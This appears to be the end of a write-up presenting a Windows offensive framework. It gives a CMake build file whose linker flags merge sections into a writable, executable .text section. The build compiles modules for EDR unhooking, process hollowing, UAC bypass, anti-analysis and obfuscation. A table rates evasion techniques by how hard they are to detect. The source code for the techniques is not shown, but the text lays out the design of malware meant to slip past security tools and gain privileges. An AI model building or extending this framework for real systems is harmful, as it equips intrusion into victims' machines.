set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /ENTRY:WinMainCRTStartup")
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /MERGE:.rdata=.text")
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /MERGE:.data=.text")
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SECTION:.text,EWR")
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /IGNORE:4078")

add_executable(${PROJECT_NAME} WIN32
    main.cpp
    syscalls.cpp
    edr_unhook.cpp
    process_hollow.cpp
    uac_bypass.cpp
    anti_analysis.cpp
    obfuscation.cpp
)

target_link_libraries(${PROJECT_NAME} PRIVATE
    ntdll.lib
    shell32.lib
    ole32.lib
    oleaut32.lib
    uuid.lib
    wbemuuid.lib
)
Key Techniques Summary
Technique	Purpose	Detection Difficulty
Direct Syscalls	Bypass user-mode hooks	High
NTDLL Unhooking	Remove EDR hooks	Medium
Process Hollowing	Stealthy execution	Medium
UAC Bypass	Privilege escalation	Low (if using auto-elevate)
WMI Checks	VM detection	Low
TLS Callbacks	Pre-execution debugger detection	Medium
String Obfuscation	Static analysis prevention	High
This framework demonstrates advanced Windows internals knowledge essential for red team operations and security research.